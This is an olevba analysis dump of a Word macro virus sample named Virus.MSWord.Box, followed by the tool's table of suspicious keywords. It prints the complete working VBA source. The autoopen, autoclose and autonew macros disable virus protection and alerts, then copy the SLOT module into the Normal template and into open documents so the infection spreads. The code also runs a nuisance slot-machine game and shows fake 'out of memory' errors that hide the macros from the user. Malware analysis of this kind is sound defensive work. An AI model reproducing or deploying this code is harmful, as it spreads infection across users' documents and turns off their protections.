olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SLOT.bas 
in file: Virus.MSWord.Box - OLE stream: 'Macros/VBA/SLOT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoclose()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1"
exit_:
End Sub

Sub autoopen()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll
WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1"

exit_:
End Sub


Sub box1()
ReDim nm__(2)
Dim monkey
Dim tog$
Dim i
Dim x
Dim a$
WordBasic.DisableInput 1
 
On Error Resume Next
If WordBasic.Day(WordBasic.Now()) <= WordBasic.Int(Rnd() * 30) Then GoTo exit_

slotgame:
On Error Resume Next
Err.Number = 0
monkey = -1
tog$ = ""
i = 0
While monkey = -1
For i = 0 To 2
nm__(i) = WordBasic.Int(Rnd() * 10)
If i = 2 Then
tog$ = tog$ + Str(nm__(2))
GoTo banana
End If
tog$ = tog$ + Str(nm__(i))
Next i
banana:
WordBasic.Beep

WordBasic.MsgBox "今天是 " + WordBasic.[Date$]() + " ,跟你玩一個SLOT的遊戲" + Chr(13) + _
" 試試你的手氣吧 !你這把的幸運號碼是. . . " + Chr(13) + _
tog$ + " ", "Macro Slot Game 4 for Word97"
If tog$ = Str(nm__(i)) + Str(nm__(i)) + Str(nm__(i)) Then
WordBasic.Beep

lucky7:
WordBasic.MsgBox " 咦.......你的手氣不錯喔! ", _
"Macro Slot Game 4 for Word97"
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Font:="細明體", Points:=64, Color:=2, Bold:=1, Underline:=1
WordBasic.Insert "嗯! 算 你 走 運 !!"
For x = 1 To 10
WordBasic.Beep
Next x
GoTo exit_

Else
WordBasic.Beep
On Error GoTo -1: On Error GoTo slotgame
Err.Number = 0
a$ = WordBasic.[InputBox$]("你的手氣太背了 ! 給你一個翻本的機會或是試試下一把吧 ! 請輸入三位數過關密碼  , 猜中了就保送你過關 ! 當然 !  你不猜也行 ! ", _
"Macro Slot Game 4 for Word97")
WordBasic.Beep
If a$ = "777" Then GoTo unlucky Else GoTo try
End If

try:
On Error Resume Next
Err.Number = 0
WordBasic.MsgBox " 這 樣 子 不 行 喔 !你 必 須 輸 入 正 確 的 密 碼 或 是 按 下 取 消 才 行 喔 ! ", _
"Macro Slot Game 4 for Word97"
GoTo slotgame
Wend


unlucky:

On Error Resume Next
WordBasic.MsgBox "OK ! Now We EXIT!", _
"Macro Slot Game 4 for Word97"

exit_:
End Sub

Sub toolsmacro()

WordBasic.DisableInput 1
On Error Resume Next
WordBasic.Beep
WordBasic.MsgBox "記憶體用完", "Microsoft Visual Basic", 48


End Sub


Sub FileTemplates()
WordBasic.Beep
WordBasic.MsgBox "記憶體用完", "Microsoft Visual Basic", 48

End Sub

Sub autonew()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1"
exit_:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

